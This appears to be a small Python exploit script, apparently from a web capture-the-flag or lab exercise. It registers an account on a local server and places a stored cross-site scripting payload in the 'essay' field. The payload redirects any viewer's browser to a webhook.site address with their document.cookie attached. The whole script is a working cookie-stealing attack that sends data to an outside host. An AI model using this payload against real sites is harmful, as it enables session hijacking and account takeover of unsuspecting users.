import requests as r 
url = input("Add you webhook URL\n")

data= {
    "email":"urmom",
    "essay":"""
<script id='welcome' src="/static/js/thing.js" data-ihaterit="document.location=`https://webhook.site/3fdc6051-e65b-42f4-86b8-97bce2bd6969?value=${document.cookie}`"></script>
"""
}

r1=r.post("http://127.0.0.1:8000/register",data=data)

